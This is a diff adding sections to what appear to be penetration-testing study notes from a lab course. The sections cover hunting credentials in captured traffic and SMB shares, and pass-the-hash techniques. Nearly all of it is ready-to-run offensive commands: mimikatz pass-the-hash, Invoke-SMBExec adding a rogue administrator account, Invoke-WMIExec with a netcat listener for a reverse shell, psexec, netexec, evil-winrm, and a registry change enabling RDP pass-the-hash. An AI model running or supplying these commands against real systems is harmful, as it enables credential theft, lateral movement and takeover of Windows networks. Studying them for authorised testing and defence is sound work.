@@ -358,3 +358,105 @@ $ python3.9 firefox_decrypt.py
 $ python3 laZagne.py browsers
 ```
 %% LaZagne can also return results if the user has used the supported browser. %%
+
+### Credential Hunting in Network Traffic
+
+| Wireshark filter                                | Description                                                                                                                                                                          |
+| ----------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
+| ip.addr == 56.48.210.13                         | Filters packets with a specific IP address                                                                                                                                           |
+| tcp.port == 80                                  | Filters packets by port (HTTP in this case).                                                                                                                                         |
+| http                                            | Filters for HTTP traffic.                                                                                                                                                            |
+| dns                                             | Filters DNS traffic, which is useful to monitor domain name resolution.                                                                                                              |
+| tcp.flags.syn == 1 && tcp.flags.ack == 0        | Filters SYN packets (used in TCP handshakes), useful for detecting scanning or connection attempts.                                                                                  |
+| icmp                                            | Filters ICMP packets (used for Ping), which can be useful for reconnaissance or network issues.                                                                                      |
+| http.request.method == "POST"                   | Filters for HTTP POST requests. In the case that POST requests are sent over unencrypted HTTP, it may be the case that passwords or other sensitive information is contained within. |
+| tcp.stream eq 53                                | Filters for a specific TCP stream. Helps track a conversation between two hosts.                                                                                                     |
+| eth.addr == 00:11:22:33:44:55                   | Filters packets from/to a specific MAC address.                                                                                                                                      |
+| ip.src == 192.168.24.3 && ip.dst == 56.48.210.3 | Filters traffic between two specific IP addresses. Helps track communication between specific hosts.                                                                                 |
+
+```
+$ ./Pcredz -f demo.pcapng -t -v
+```
+%% pcredz to extract credentials from live traffic or network packet captures %%
+
+### Credential Hunting in Network Shares
+```
+c:\Users\Public>Snaffler.exe -s
+```
+%% snaffler identifies  accessible network shares and searches for interesting files %%
+
+```
+PS C:\Users\Public\PowerHuntShares> Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\Users\Public
+```
+%% does not need to be domain-joined %%
+
+```
+$ docker run --rm -v ./manspider:/root/.manspider blacklanternsecurity/manspider 10.129.234.121 -c 'passw' -u 'mendres' -p 'Inlanefreight2025!'
+```
+%%  A basic scan for files containing the string passw , you don't need access to a domain-joined computer %%
+
+```
+$ nxc smb 10.129.234.121 -u mendres -p 'Inlanefreight2025!' --spider IT --content --pattern "passw"
+```
+%% A basic scan of network shares for files containing the string "passw" %%
+
+```
+$ nxc smb 10.129.235.120 -u mendres -p 'Inlanefreight2025!' -M spider_plus -o DOWNLOAD_FLAG=true --smb-timeout 60 
+```
+%% download share contents %%
+
+```
+$ smbclient //10.129.235.120/IT -U 'INLANEFREIGHT\mendres%Inlanefreight2025!' -c 'get Tools/split_tunnel.txt split_tunnel.txt'
+```
+%% using smbclient to download a file directly %%
+
+```
+$ nxc smb 10.129.235.120 -u mendres -p 'Inlanefreight2025!' --share IT --get-file Tools/split_tunnel.txt /tmp/split_tunnel.txt
+```
+%% using nxc to get a specific file for a host %%
+
+```
+$ grep -ri "passw" .
+```
+%% look for passwords in the current directory %%
+
+### Pass the Hash (PtH)
+```
+c:\tools> mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
+```
+%%  /user reps the user name we want to impersonate;  /NTLM reps the hash of the user's password; /domain the user belongs to; /run is the program we want to run with user's context %%
+
+```
+PS c:\htb> cd C:\tools\Invoke-TheHash\
+PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
+PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
+```
+%% Target reps hostname or IP address of the target; Username  is Username to use for authentication; Domain is Domain to use for authentication. This parameter is unnecessary with local accounts or when using the @domain after the username;  Hash is NTLM password hash for authentication. This function will accept either LM:NTLM or NTLM format; Command  is Command to execute on the target. If a command is not specified, the function will check to see if the username and hash have access to WMI on the target. %%
+
+```
+PS C:\tools> .\nc.exe -lvnp 8001
+PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
+PS c:\tools\Invoke-TheHash> Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e <rev_shell_generator>
+```
+%% result is a rev shell connection from DC01 host (172.16.1.10)%%
+
+```
+$ impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
+```
+%% pass the hash with psexec %%
+
+```
+# netexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
+```
+%% pass the hash with nxc with -x for command execution %%
+
+```
+$ evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
+```
+%% pass the hash with evil-winrm %%
+
+```
+c:\tools> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
+```
+%% Enable Restricted Admin Mode to allow PtH on rdp %%
+
